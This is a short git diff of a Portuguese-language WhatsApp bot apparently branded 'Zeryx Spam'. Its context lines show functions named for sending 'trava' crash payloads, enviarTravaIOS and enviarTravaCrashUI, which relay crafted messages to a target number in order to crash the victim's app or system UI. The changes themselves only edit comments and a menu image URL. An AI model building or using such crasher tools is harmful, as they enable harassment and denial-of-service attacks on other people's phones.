@@ -120,7 +120,7 @@ async function enviarTravaIOS(sock, jidAlvo) {
     await sock.relayMessage(jidAlvo, payloadJson, { participant: { jid: jidAlvo } });
 }
 
-// 3. Crash UI / System UI (Baseado nos prints)
+// 3. Crash UI / System UI
 async function enviarTravaCrashUI(sock, jidAlvo) {
     const payloadJson = {
         interactiveMessage: {
@@ -213,7 +213,7 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
             if (!texto) return;
             console.log(`Mensagem recebida de ${remoteJid}:${texto}`);
 
-            // MENU INTERATIVO AVANÇADO (ESTILO PAXLEY / ZERYX COM FOTO DO GITHUB)
+            // MENU INTERATIVO COM A FOTO DO GITHUB (8ca5272eef8a84db9a57c074a39c30eb.jpg)
             if (texto.trim() === '/menu') {
                 const numeroUsuario = remoteJid.split('@')[0];
                 const dataHoraAtual = new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' });
@@ -225,7 +225,7 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                                 header: {
                                     hasMediaAttachment: true,
                                     imageMessage: {
-                                        url: "https://raw.githubusercontent.com/wv0304362-bot/ZRX-BANCEK-/main/menu.jpg",
+                                        url: "https://raw.githubusercontent.com/wv0304362-bot/ZRX-BANCEK-/main/8ca5272eef8a84db9a57c074a39c30eb.jpg",
                                         mimetype: "image/jpeg",
                                         caption: "⚡ *Ϟ 𝐙⃯𝚵𝐑𝐘𝐗 𝐒𝐏⃯∆𝐌 Ϟ* ⚡\n> _O poder absoluto nas mãos de LOTUX._\n> 「 ⓘ. Zeryx - System 」"
                                     }
